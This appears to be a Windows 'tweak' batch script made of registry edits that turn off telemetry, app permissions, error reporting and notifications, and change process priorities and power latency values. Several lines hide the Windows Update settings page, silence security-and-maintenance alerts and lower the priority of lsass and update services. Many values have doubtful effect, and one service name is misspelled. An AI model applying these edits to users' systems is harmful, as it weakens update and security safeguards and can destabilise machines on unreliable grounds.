Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CPSS\DevicePolicy\TailoredExperiencesWithDiagnosticDataEnabled" /v "DefaultValue" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\EventTranscriptKey" /v "EnableEventTranscript" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Siuf\Rules" /v "NumberOfSIUFInPeriod" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKU\S-1-5-18\Software\Microsoft\Siuf\Rules" /v "NumberOfSIUFInPeriod" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone" /v "Value" /t REG_SZ /d "Allow" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone" /v "Value" /t REG_SZ /d "Allow" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userNotificationListener" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userNotificationListener" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\activity" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\activity" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userAccountInformation" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userAccountInformation" /v "Value" /t REG_SZ /d "Deny" /f >nul
@timeout /t 03 >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appointments" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appointments" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userDataTasks" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userDataTasks" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\chat" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\chat" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\radios" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\radios" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\bluetoothSync" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\bluetoothSync" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "BackgroundAppGlobalToggle" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Search" /v "BackgroundAppGlobalToggle" /t REG_DWORD /d "0" /f >nul
@timeout /t 03 >nul
Reg.exe add "HKU\S-1-5-18\Software\Microsoft\Windows\CurrentVersion\Search" /v "BackgroundAppGlobalToggle" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appDiagnostics" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appDiagnostics" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\documentsLibrary" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\documentsLibrary" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\picturesLibrary" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\picturesLibrary" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\videosLibrary" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\videosLibrary" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\broadFileSystemAccess" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\broadFileSystemAccess" /v "Value" /t REG_SZ /d "Deny" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\WcmSvc\wifinetworkmanager\config" /v "AutoConnectAllowedOEM" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\WiFi\AllowWiFiHotSpotReporting" /v "value" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\WiFi\AllowAutoConnectToWiFiSenseHotspots" /v "value" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\GameBar" /v "ShowStartupPanel" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "SettingsPageVisibility" /t REG_SZ /d "hide:cortana;privacy-automaticfiledownloads;privacy-feedback;windowsinsider;windowsupdate;cortana-windowssearch;;cortana-windowssearch;" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMax" /t REG_DWORD /d "0" /f >nul
@timeout /t 03 >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "DpiMapIommuContiguous" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\FTH" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Executive" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\ModernSleep" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "PlatformAoAcOverride" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EnergyEstimationEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EventProcessorEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "CsEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DistributeTimers" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\GpuEnergyDrv" /v "Start" /t REG_DWORD /d "4" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\GpuEnergyDr" /v "Start" /t REG_DWORD /d "4" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy" /v "DisableTaggedEnergyLogging" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy" /v "TelemetryMaxApplication" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy" /v "TelemetryMaxTagPerApplication" /t REG_DWORD /d "0" /f >nul
@timeout /t 03 >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\System" /v "AllowExperimentation" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\System\AllowExperimentation" /v "value" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Reliability" /v "TimeStampInterval" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Reliability" /v "IoPriority" /t REG_DWORD /d "3" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RemediationRequired" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SoftLandingEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RotatingLockScreenOverlayEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CDP" /v "CdpSessionUserAuthzPolicy" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CDP" /v "NearShareChannelUserAuthzPolicy" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "ShowFrequent" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "ShowRecent" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "TelemetrySalt" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRecentDocsHistory" /t REG_DWORD /d "1" /f >nul
@timeout /t 03 >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "HistoryViewEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "DeviceHistoryEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "BingSearchEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v "ToastEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings" /v "NOC_GLOBAL_SETTING_ALLOW_NOTIFICATION_SOUND" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings" /v "NOC_GLOBAL_SETTING_ALLOW_CRITICAL_TOASTS_ABOVE_LOCK" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\QuietHours" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.AutoPlay" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.LowDisk" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.Print.Notification" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.WiFiNetworkManager" /v "Enabled" /t REG_DWORD /d "0" /f >nul
@timeout /t 03 >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "PreInstalledAppsEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SilentInstalledAppsEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "OemPreInstalledAppsEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "ContentDeliveryAllowed" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContentEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "PreInstalledAppsEverEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SystemPaneSuggestionsEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338388Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-314559Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-280815Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-314563Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338393Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353694Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353696Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-310093Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-202914Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338387Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338389Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353698Enabled" /t REG_DWORD /d "0" /f >nul
@timeout /t 03 >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Accessibility" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\AppSync" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\BrowserSettings" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Credentials" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\DesktopTheme" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Language" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\PackageState" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Personalization" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\StartLayout" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Windows" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Error Reporting" /v "Disabled" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Error Reporting" /v "DoReport" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Error Reporting" /v "LoggingDisabled" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\PCHealth\ErrorReporting" /v "DoReport" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting" /v "Disabled" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\I/O System" /v "PassiveIntRealTimeWorkerPriority" /t REG_DWORD /d "18" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\KernelVelocity" /v "DisableFGBoostDecay" /t REG_DWORD /d "1" /f >nul
@timeout /t 03 >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dwm.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "4" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dwm.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "3" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe\PerfOptions" /v "PagePriority" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ntoskrnl.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "4" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ntoskrnl.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "3" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SearchIndexer.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SearchIndexer.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TrustedInstaller.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TrustedInstaller.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wuauclt.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wuauclt.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\audiodg.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "2" /f >nul
@timeout /t 03 >nul
Reg.exe add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\audiodg.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "2" /f >nul
Reg.exe add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dwm.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "4" /f >nul
Reg.exe add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dwm.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "3" /f >nul
Reg.exe add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe\PerfOptions" /v "PagePriority" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ntoskrnl.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "4" /f >nul
Reg.exe add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ntoskrnl.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "3" /f >nul
Reg.exe add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SearchIndexer.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SearchIndexer.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TrustedInstaller.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TrustedInstaller.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wuauclt.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wuauclt.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "0" /f >nul
@timeout /t 03 >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorLatencyTolerance" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatency" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatencyCheckEnabled" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Latency" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceDefault" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceFSVP" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyTolerancePerfOverride" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceScreenOffIR" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceVSyncEnabled" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "RtlCapabilityCheckLatency" /t REG_DWORD /d "1" /f >nul
@timeout /t 03 >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyActivelyUsed" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleLongTime" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleMonitorOff" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleNoContext" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleShortTime" /t REG_DWORD /d "1" /f >nul
